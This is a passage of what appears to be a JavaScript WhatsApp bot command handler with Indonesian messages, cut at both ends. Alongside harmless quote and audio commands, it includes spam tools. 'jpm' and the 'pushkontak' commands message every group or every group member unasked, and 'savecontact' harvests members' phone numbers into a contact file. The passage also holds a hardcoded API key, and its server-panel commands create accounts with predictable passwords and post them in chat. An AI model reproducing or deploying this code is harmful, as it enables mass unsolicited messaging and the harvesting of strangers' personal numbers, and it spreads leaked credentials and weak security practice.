 "arabic": "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ",
 "arti": "Barang siapa membantumu dalam kejahatan, maka sesungguhnya ia telah berbuat aniaya terhadapmu."
}
]
const randomIndex = Math.floor(Math.random() * islami.length);
const randomQuote = islami[randomIndex];
const { arabic, arti } = randomQuote;
m.reply(`${arabic}\n${arti}`)
}
break
//=================================================//
case 'doatahlil': {
let { result } = JSON.parse(fs.readFileSync('./lib/tahlil.json', 'utf-8'))
let caption = result.map((v, i) => {
return `
*${i + 1}.* ${v.title}

❃ Arabic :
${v.arabic}

❃ Translate :
${v.translation}
`.trim()
}).join('\n\n')
m.reply(`${caption}`)
}
break

//Sound
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161': {
koi = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await qio.sendMessage(m.chat, { audio: koi, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
break

//Cekrik
case "sshp": {
if (!text) return m.reply(`*Example: ${prefix+command} ${global.yt}*`)
let phone = await ssweb(text, "phone")
qio.sendFile(m.chat, phone.result, "", ``, m, false)
}
break
//=================================================//
case "sspc": {
if (!text) return m.reply(`*Example: ${prefix+command} ${global.yt}*`)
let desktop = await ssweb(text, "desktop")
qio.sendFile(m.chat, desktop.result, "", ``, m, false)
}
break
//=================================================//
case "sstablet": {
if (!text) return m.reply(`*Example: ${prefix+command} ${global.yt}*`)
let tablet = await ssweb(text, "tablet")
qio.sendFile(m.chat, tablet.result, "", ``, m, false)
}
break

//Fitur Nge Jb
case "jpm": case "post": {
if (!isPrem) return qioreply(mess.prem)
if (!text) return qioreply(
`
*🗿🚬Gagitu Bego, Kek Gini Caranya :*

*${prefix+command} teks|jeda\n\n

‼️Reply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik
`
)
await qioreply(mess.wait)
let getGroups = await qio.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await qio.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await qio.downloadAndSaveMediaMessage(quoted)
memek = await uptotelegra(media)
await qio.sendMessage(xnxx, { image: { url: memek }, caption: text.split('|')[0]}, { quoted: m })
await sleep(text.split('|')[1])
} else {
await qio.sendMessage(xnxx, { text: text.split('|')[0] }, { quoted: m })
await sleep(text.split('|')[1])
}}
qioreply(mess.succes);
}
break
//=================================================//
case "cekidgc": {
if (!isDeveloper) return qioreply('*khusus owner*') 
qioreply('Bentar Ya')
let getGroups = await qio.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `𖥂 *LIST Grub Lu*\n\n💺Total Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await qio.groupMetadata(x)
teks += `⿻ *INFO GROUP*\n│𖥂 *NAMA :* ${metadata2.subject}\n│𖥂 *ID :* ${metadata2.id}\n│𖥂 *MEMBER :* ${metadata2.participants.length}\n╰────|⿻\n\n`
}
qioreply(teks)
}
break
//=================================================//
case "pushkontakv1":
case 'pushkontakid':
case "pushkontakidgc": {
if (!isPrem) return qioreply(mess.prem)
if (!text) return qioreply(
`
*🗿🚬Gagitu Bego, Nih Gw Ajarin :*

${prefix+command} idgc|teksnya

‼️*Id gc itu id grub, cara cek nya ketik aj "> m.chat" di dalam grub ,nanti id grub tersebut bakal muncul. untuk alternatif nya, lu bisa make command ".cekidgc" untuk ngelihat semua id groub dari grub yang ada di nomor bot (Ini Khusus Owner (nomor bot) )*
`
)
const metadata2 = await qio.groupMetadata(q.split("|")[0])
const colls = metadata2.participants
for (let mem of colls) {
qio.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] }, { quoted: m }
)
await sleep(1500)
}
qioreply(mess.succes)
}
break
//=================================================//
case 'pushkonv2': case 'pushv2': case 'pushkontakv2':{
if (!isPrem) return qioreply(mess.prem)
if (!isGroup) return qioreply(mess.ingroup)
if (!text) return qioreply(
`
*🗿🚬Gagitu Bego, Nih Gw Ajarin :*

*${prefix+command}\n\nContoh : Sve qio Ganteng, Nama Mu Siapa? Mau Jadi Pacar Gw Gk?*
`
)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let pler of mem) {
qio.sendMessage(pler, { text: q }, { quoted: m })
await sleep(1500)
}
qioreply(mess.succes)
}
break
//=================================================//
case "pushkontakv3":
if (!isPrem) return qioreply(mess.prem)
if (!isGroup) return qioreply(mess.ingroup)
if (!text) return qioreply(
`
*🗿🚬Gagitu Bego, Nih Gw Ajarin :*

${prefix+command} jeda|teks

‼️Reply Gambar Untuk Mengirim Gambar Ke Semua Participant,Untuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik
`
)
let jedany = text.split("|")[0]
let captny = text.split("|")[1]
await qioreply(mess.wait)
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (/image/.test(mime)) {
media = await qio.downloadAndSaveMediaMessage(quoted)
memek = await uptotelegra(media)
await qio.sendMessage(men, { image: { url: memek }, caption: captny }, { quoted: m })
await sleep(1500)
await qio.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
} else {
await qio.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
}
}
qioreply(mess.succes)
break
//=================================================//
case "savecontact": {
if (!isPrem) return qioreply(mess.prem)
if (!text) return qioreply(
`
*🗿🚬Gagitu Bego, Nih Gw Ajarin :*

${prefix+command} idgroup

‼️Untuk Liat Id Group Silahkan Ketik .cekidgc`)
await qioreply(mess.wait)
const groupMetadataa = !m.isGroup? await qio.groupMetadata(`${text}`).catch(e => {}) : ""
const participants = !m.isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./lib/lowdb/adapters/basedate/contacts.json', JSON.stringify(contacts))
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./lib/lowdb/adapters/basedate/contacts.vcf", vcardContent, "utf8");
} catch (err) {
qioreply(util.format(err))
} finally {
await qio.sendMessage(m.sender, { document: fs.readFileSync("./lib/lowdb/adapters/basedate/contacts.vcf"), fileName: "contacts.vcf", caption: 
`🌤️Succes Om, UwU

‼️ Cara Menggunakan =
 • Download Filenya
 • Lalu Pencet Filenya
 • Import Ke Kontak
 • Pilih Email Yang Akan Digunakan

🗿👌 Selesai `,
 mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./lib/lowdb/adapters/basedate/contacts.json", JSON.stringify(contacts))
}
await qioreply(mess.succes)
}
break
//=================================================//
case "lookup": {
//inireact();
if (!q) return m.reply(`Example: ${m.prefix + m.command} 62XXXX`);
try {
var response = await fetch(`http://apilayer.net/api/validate?access_key=4a1ede76e87d9e64682b284e8620ad68&number=+${q}&country_code=&format=1`);
var result = await response.json();
qioreply(JSON.stringify(result, null, 2));
} catch (error) {
m.reply(`Error: ${error.message}`);
}
}
break

// Stalk
case 'tiktokstalk':
case 'ttstalk': {
  if (!text) return m.reply(`Username? `)
let res = await fg.ttStalk(args[0])
let txt = `
┌──「 *TIKTOK STALK* 
──「 *TIKTOK STALK* 
▢ *🔖Number:* ${res.name}
▢ *🔖Username:* ${res.username}
▢ *👥followers:* ${res.followers}
▢ *🫂following:* ${res.following}
▢ *📌Desc:* ${res.desc}

▢ *🔗 Link* : https://tiktok.com/${res.username}
└────────────`
await qio.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m })
}
break
//=================================================//
case 'igstalk': {
if (!args[0]) return m.reply(`Enter Instagram Username\n\nExample: ${prefix + command} unucorn_xeon13`)
try {
let res = await fg.igStalk(args[0])
let te = `
┌──「 *STALKING* 
▢ *🔖Name:* ${res.name} 
▢ *🔖Username:* ${res.username}
▢ *👥Follower:* ${res.followersH}
▢ *🫂Following:* ${res.followingH}
▢ *📌Bio:* ${res.description}
▢ *🏝️Posts:* ${res.postsH}
▢ *🔗 Link* : https://instagram.com/${res.username.replace(/^@/, '')}
└────────────`
 await qio.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m })
} catch {
m.reply(`Make sure the username comes from *Instagram*`)
}
}
break
//=================================================//
case 'ffstalk':{
if (!q) return m.reply(`Example ${prefix+command} 946716486`)
qioreply(mess.wait)
eeh = await ffstalk.ffstalk(`${q}`)
m.reply(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
//=================================================//
case 'mlstalk': {
if (!q) return m.reply(`Example ${prefix+command} 530793138|8129`)
qioreply(mess.wait)
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
m.reply(`*/ Mobile Legend Stalker \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`)
}
break
//=================================================//
case 'npmstalk':{
if (!q) return m.reply(`Example ${prefix+command} xeonapi`)
qioreply(mess.wait)
eha = await npmstalk.npmstalk(q)
m.reply(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
//=================================================//
case 'ghstalk': case 'githubstalk':{
if (!q) return m.reply(`Example ${prefix+command} DGXeon`)
qioreply(mess.wait)
aj = await githubstalk.githubstalk(`${q}`)
qio.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break

//Panel
case 'listram': {
m.reply(`  ListRam ( ${global.namabot} )
 
  𖣂 Sc Private 𖤲 <特> 𖤲
 名前 : ${m.pushName}}
    ⛩️ タグ : @${m.sender.split('@')[0]}
 
1GB Cpu: 50% - 3.000/bln
2GB Cpu: 70% - 5.000/bln
3GB Cpu: 90% - 7.000/bln
4GB Cpu: 110% - 9.000/bln
5GB Cpu: 130% - 11.000/bln
6GB Cpu: 150% - 13.000/bln
7GB Cpu: 170% - 15.000/bln
8GB Cpu: 200% - 17.000/bln`)
}
break
//=================================================//
case "listsrv": {
if (!isPrem) return qioreply(mess.prem)
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
let sections = [];
let messageText = "Berikut adalah daftar server:\n\n";

for (let server of servers) {
let s = server.attributes;

let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
});

let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;

messageText += `ID Server: ${s.id}\n`;
messageText += `Nama Server: ${s.name}\n`;
messageText += `Status: ${status}\n\n`;
}

messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total Server: ${res.meta.pagination.count}`;

await qio.sendMessage(m.chat, { text: messageText }, { quoted: m });

if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
m.reply(`Gunakan perintah ${prefix ? prefix : '.'}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
}
}
break;

case "delsrv": {
if (!isPrem) return qioreply(mess.prem)
let srv = args[0]
if (!srv) return qioreply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return qioreply('Server tidak ditemukan')
qioreply('Berhasil minghapus Server.')
}
break
//=================================================//
case "listusr": {
if (!isPrem) return qioreply(mess.prem)
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let users = res.data;
let messageText = "Berikut list user:\n\n";

for (let user of users) {
let u = user.attributes;
messageText += `ID: ${user.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
messageText += ` ${user.username}\n`;
messageText += `${u.first_name} ${u.last_name}\n\n`;
}

messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total Users: ${res.meta.pagination.count}`;

await qio.sendMessage(m.chat, { text: messageText }, { quoted: m });

if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
m.reply(`Gunakan perintah ${prefix ? prefix : '.'}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
}
}
break
//=================================================//
case "delusr": {
if (!isPrem) return qioreply(mess.prem)
let usr = args[0]
if (!usr) return qioreply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return qioreply('User tidak ditemukan')
qioreply('Berhasil menghapus User')
}
break
//=================================================//
case "addsrv": {
if (!isPrem) return qioreply(mess.prem)
let s = text.split(',');
if (s.length < 7) return m.reply(`> *Format salah!*

❗ Penggunaan:
${prefix + command} nama panel,tanggal,id user yang ingin ditambah kan server,eggId,locationId,memory/disk,cpu

\`✅ Example\` : addsrv ঔৣ⃕᭝𝐀𝐥𝐰𝐚𝐲𝐬𝐃𝐢𝐱𝐳᭄o,26 Desember 2018,1,15,1,0/0,0
`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name + ' Cp-qio',
"description": 'Create with ' + namabot,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_19",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return qioreply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
m.reply(`
❗ *SUCCESSFULLY ADD SERVER*

TYPE: \`${res.object}\`

ID: \`${server.id}\`
UUID: ${server.uuid}\`
NAME: ${server.name}\`
DESCRIPTION: \`${server.description}\`
MEMORY: \`${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB\`
DISK: \`${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB\`
CPU: \`${server.limits.cpu}%\`
CREATED AT: ${server.created_at}\``)
}
break

//Panel wak

case '1gb': {
if(!isReseller){
qioreply(mess.seller)
}
if (!isPrem) return qioreply(mess.prem)
let t = text.split(',');
if (t.length < 2) return m.reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "50"
let disk = "1024"
let email = username + "qio@sweetrabit.ml"
akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg" 
if (!u) return
let d = (await qio.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return qioreply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`User ID: ${user.id}`)
let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
qio.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return qioreply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break
//=================================================//
case '2gb': {
if(!isReseller){
qioreply(mess.seller)
}
if (!isPrem) return qioreply(mess.prem)
let t = text.split(',');
if (t.length < 2) return m.reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "2024"
let cpu = "70"
let disk = "2024"
let email = username + "qio@sweetrabit.ml"
akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg" 
if (!u) return
let d = (await qio.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return qioreply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`User ID: ${user.id}`)
let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
qio.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 2gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return qioreply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break
//=================================================//
case '3gb': {
if(!isReseller){
qioreply(mess.seller)
}
if (!isPrem) return qioreply(mess.prem)
let t = text.split(',');
if (t.length < 2) return m.reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "3024"
let cpu = "90"
let disk = "3024"
let email = username + "qio@sweetrabit.ml"
akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg" 
if (!u) return
let d = (await qio.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return qioreply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`User ID: ${user.id}`)
let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
qio.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 3gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return qioreply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break
//=================================================//
case '8gb': {
if (!isPrem) return qioreply(mess.prem)
let t = text.split(',');
if (t.length < 2) return m.reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "8024"
let cpu = "200"
let disk = "8024"
let email = username + "qio@sweetrabit.ml"
akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg" 
if (!u) return
let d = (await qio.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return qioreply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`User ID: ${user.id}`)
let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
qio.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
